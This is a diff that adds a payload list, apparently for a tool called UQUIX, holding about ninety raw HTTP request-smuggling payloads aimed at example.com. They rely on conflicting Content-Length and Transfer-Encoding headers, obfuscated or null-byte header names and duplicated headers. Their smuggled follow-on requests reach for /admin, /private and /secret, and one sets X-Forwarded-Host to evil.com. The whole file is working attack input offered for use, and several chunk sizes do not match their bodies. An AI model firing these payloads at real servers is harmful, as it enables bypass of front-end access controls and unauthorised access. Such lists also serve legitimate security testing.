@@ -1,0 +1,923 @@
+=== All Payloads here are HTTP-SMUGGLING Payloads by default, UQUIX ===
+
+METHOD / HTTP/1.1
+Host: example.com
+Content-Length: 30
+Transfer-Encoding: chunked
+
+0
+
+METHOD /next HTTP/2
+Host: example.com
+Content-Length: 15
+
+GET /pass HTTP/1.1
+===
+METHOD / HTTP/2
+Host: example.com
+Content-Length: 20
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked%0d%0aContent-Length: 6%0d%0a
+
+0
+GET /pass HTTP/1.1
+===
+METHOD / HTTP/1.1
+Host: example.com
+TRANSFER-ENCODING: chunked
+Content-Length: 6
+
+5
+RRR
+0
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+
+7FF
+ATTACK
+0
+===
+HEAD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+
+0
+
+GET /private HTTP/1.1
+===
+METHOD / HTTP/1.1
+Host: example.com
+Content-Length: 50
+Transfer-Encoding: chunKEd
+
+0
+4
+HIDDEN
+0
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+Content-Length: 50
+
+6
+ATTACK
+0
+4
+HIDDEN
+0
+===
+METHOD / HTTP/1.1
+Host: example.com
+Content-Length: 3
+Transfer-Encoding: chunked
+
+9
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+0
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+Content-Length: 15
+
+5
+-0
+0
+
+GET /private HTTP/1.1
+Host: example.com
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+Transfer-Encoding: cHunked, xchunked
+Content-Length: 50
+
+6
+TEST
+0
+4
+DATA
+0
+===
+METHOD / HTTP/1.1
+Host: example.com
+Content-Length: 4
+Transfer-Encoding: cHunked
+
+0
+
+X: X
+===
+METHOD / HTTP/1.1
+Host: example.com
+Content-Length: 20
+Transfer-Encoding: chunked
+
+0
+GET /injected HTTP/1.1
+Host: example.com
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding\x00: chunked
+Content-Length: 6
+
+5
+NULLBY
+0
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding:[tab]chuUked
+Content-Length: 6
+
+5
+ATTACK
+0
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: ychunked
+
+4
+abcd
+0
+===
+METHOD / HTTP/1.1
+Host: example.com
+Content-Length: 20
+Content-Length: 50
+
+0
+
+GET /unauthorized HTTP/1.1
+Host: example.com
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+Content-Length: 20
+
+6; extension=mix
+ATTACK
+0
+
+GET /hidden HTTP/1.1
+Host: example.com
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+Content-Length: 6
+admin=False
+
+5
+ATTACK
+0
+admin=True
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: cHunked
+Content-Length: 6
+Transfer-Encoding: chunkeD, xchunKed
+
+5
+TEST
+0
+===
+METHOD / HTTP/1.1
+Host: example.com
+[space]Transfer-Encoding: chunked
+
+4
+abcd
+0
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked, chunked
+
+7
+GOTchAYoOo!
+0
+admin=True;
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+Content-Length: 6
+admin=True;;;
+
+5
+O%O
+0
+admin=False;
+admin=True
+===
+METHOD / HTTP/1.1
+Host: example.com
+X-Transfer-Encoding: chUnked
+Content-Length: 6
+
+0
+
+O%O
+===
+METHOD / HTTP/1.1
+Host: example.com
+Content-Length: 15
+Transfer-Encoding: chuNKEd
+
+0
+
+GET /stealth HTTP/1.1
+Host: example.com
+Connection: close
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: cHUNked, chunked
+
+8
+TESTD
+0
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+Content-Length: 6
+
+5
+-0ED
+0
+
+GET /admin HTTP/1.1
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+Content-Length: 10
+
+5
+EVIL
+0
+
+GET /hidden-admin HTTP/1.1
+Host: example.com
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+Transfer-Encoding: chunked, xchunked
+Content-Length: 6
+
+5
+ATTACK
+0
+admin=true
+
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+Transfer-Encoding: chunked, xchunked
+Content-Length: 6
+
+5
+O%O
+0
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+Content-Length: 4
+
+3
+X:
+0
+admin=True
+===
+METHOD / HTTP/1.1
+Host: example.com
+Content-Length: 3
+Transfer-Encoding: chunked
+
+15
+CREEPYREQ
+0
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+Content-Length: 20
+Transfer-Encoding: chunked
+
+0
+GET /injected HTTP/1.1
+Host: example.com
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+Transfer-Encoding:[tab]chunked
+Content-Length: 6
+
+5
+ATTACK
+0
+===
+METHOD / HTTP/1.1
+Host: example.com
+Content-Length: 13
+
+Transfer-Encoding: chunked
+
+0
+TESTD
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: xchunked
+
+0
+
+TESTD
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunKeD, chunked
+Content-Length: 50
+
+6
+ATTACK
+0
+4
+HIDDEN
+0
+admin=True
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+Content-Length: 30
+
+0
+GET /sensitive-data HTTP/1.1
+Host: example.com
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+Content-Length: 15
+Transfer-Encoding: chunked
+
+0
+
+GET /stealth HTTP/1.1
+Host: example.com
+Connection: close
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+Transfer-Encoding: chunked, xchunked
+Content-Length: 6
+
+5
+ATTACK
+0
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+Content-Length: 13
+
+0
+TESTD
+===
+METHOD / HTTP/1.1
+Host: example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1\x00
+GET /secret HTTP/1.1
+Host: example.com
+===
+METHOD / HTTP/1.1
+Host: example.com
+[space]Transfer-Encoding: chunked
+
+0
+
+TESTD
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunKed\x00chunked
+Content-Length: 6
+
+5
+ATTACK
+0
+admin=True
+===
+METHOD / HTTP/1.1
+Host: example.com
+Content-Length: 15
+Transfer-Encoding: chunked
+
+f
+GPOST / HTTP/1.1
+Host: example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 12
+
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+Content-Length:[tab]6
+
+5
+EVIL
+0
+===
+METHOD / HTTP/1.1
+Host: example.com
+Content-Length: 6
+Content-Length: 3
+
+X:
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+Content-Length: 20
+
+6
+ATTACK
+0
+
+GET /hidden-page HTTP/1.1
+Host: example.com
+===
+METHOD / HTTP/1.1
+Host: example.com
+Content-Length: 11
+Transfer-Encoding: chuNked
+
+b
+q=toxic
+0
+===
+METHOD / HTTP/1.1
+Host: example.com
+Content-Length: 6
+Transfer-Encoding: chunked
+
+5
+MALIC
+0
+
+GET /pass HTTP/1.1
+Host: example.com
+===
+METHOD / HTTP/1.1
+Host: example.com
+Content-Length: 4
+Transfer-Encoding: chunked
+
+0
+
+DATA
+admin=True
+admin=true
+admin=tRuE
+admin=TRUe
+admin=truE
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked, xchunked
+Content-Length: 50
+
+6
+TEST
+0
+4
+DATA
+0
+===
+METHOD / HTTP/1.1
+Host: example.com
+Content-Length: 6
+Content-Length: 4
+
+O%O
+admin=True
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+Transfer-Encoding: \x09chunked
+Content-Length: 6
+
+5
+PASS
+0
+===
+METHOD / HTTP/1.1
+Host: example.com
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+O%O
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+
+5; extension-mischief
+TESTD
+0
+admin=True
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+Content-Length: 10
+
+5
+ATTACK
+0
+GET /admin-panel HTTP/1.1
+Host: example.com
+X-Foo: 0\x00099RRRR
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+
+4
+abcd
+0
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+Content-Length: 3
+
+8
+TESTD
+0
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: ChUnKeD
+Content-Length: 6
+
+5
+HELLO
+0
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: [tab]chunked
+
+4
+abcd
+0
+===
+METHOD / HTTP/1.1
+Host: example.com
+Content-Length: 4
+Transfer-Encoding: chunked
+
+1
+A
+0
+GET /admin HTTP/1.1
+Host: example.com
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding : chunked
+
+4
+abcd
+0
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: xchunked
+
+4
+abcd
+0
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding:[tab]chunked
+
+0
+
+TESTD
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-EncodIng: chUnked
+Content-Length: 6
+
+5
+INJECT
+0
+
+GET /creepy HTTP/1.1
+Host: example.com
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chUNKed
+Content-Length: 6
+content-length: 8
+
+0
+admin=True
+
+GET /deep HTTP/1.1
+Host: example.com
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: cHUnked
+
+100000000
+TESTD
+0
+===
+METHOD / HTTP/1.1
+Host: example.com
+Content-Length: 63
+Transfer-Encoding: chunked
+
+0
+GET / HTTP/1.1
+User-Agent: alert(1)
+Foo: X
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+Transfer-Encoding: chunked
+Content-Length: 50
+
+6
+EVIL
+0
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+Content-Length: 50
+
+0
+
+GET /admin HTTP/1.1
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+
+Z
+ATTACK
+0
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: ChuNked; encoding=UTF-8
+
+5
+DATA
+0
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: identity
+Content-Length: 100
+
+GET /stealth HTTP/1.1
+===
+METHOD / HTTP/1.1
+Host: example.com
+X-HTTP-Method-Override: GET /admin HTTP/1.1
+===
+METHOD / HTTP/1.1
+Host: example.com
+Proxy-Connection: keep-alive
+Transfer-Encoding: chunked
+
+5
+DATA
+0
+===
+GET / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+X-Forwarded-Host: evil.com
+
+0
+admin=TruE;
+
+GET /stealth HTTP/1.1
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+Content-Length: 10
+
+5
+FFFFF
+0
+
+X-Injected: 
+Header: Value
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+Content-Length: 6
+
+5
+ATTACK
+0
+
+GET /admin HTTP/1.1\0
+===
+METHOD / HTTP/1.1
+Host: example.com
+Content-Length: 10
+Content-Length: 500
+
+X
+===
+METHOD / HTTP/1.1
+Host: example.com
+Content-Length: 6
+Foo: bar
+Transfer-Encoding: chunked
+
+5
+ATTACK
+admin=True
+admin=true
+0
+===
+METHOD / HTTP/1.1
+Host: example.com
+transfer-encoding: chunked
+content-length: 6
+
+5
+admin=TruE;
+ATTACK
+0
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+Content-Length: 50
+
+0
+
+X-Ignore: X
+
+GET /secret-admin HTTP/1.1
+Host: example.com
+===
+PRI * HTTP/2.0
+Host: example.com
+Content-Length: 50
+Transfer-Encoding: chunked
+
+admin=trUE;
+0
+GET /private HTTP/1.1
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+
+3
+XYZ
+0
+admin=True
+GET /admin HTTP/1.1
+Host: example.com
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+Content-Length: 6
+
+5
+ATTACK
+0
+GET /stealth-admin HTTP/1.1
+Host: example.com
+Connection: Keep-Alive
+===
+METHOD / HTTP/1.1
+Host: example.com
+Content-Length: 15
+Transfer-Encoding: chunked
+Foo: bar
+Transfer-Encoding: chunked
+
+0
+
+GET /hidden HTTP/1.1
+Host: example.com
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+Content-Length: 6
+Transfer-Encoding: xchunked
+
+5
+NEW_DATA;admin=TrUE;;\x00;
+0
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked, chunked
+Transfer-Encoding: chunked
+Content-Length: 6
+
+5
+PAYLOAD
+0
+GET /admin HTTP/1.1
+Host: example.com
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+X-Content-Length: 10
+Content-Length: 15
+
+5
+PASS
+0
+4
+EVIL
+0
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+Content-Length: 15
+
+0
+
+X-Ignore: X
+GET /private HTTP/1.1
+Host: example.com
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+Transfer-Encoding: chunked, xchunked
+Content-Length: 6
+
+5
+INJECT
+0
+admin=True
+===
+METHOD / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+Transfer-Encoding\x00: chunked
+Content-Length: 6
+
+5
+NULL-PASS
+0
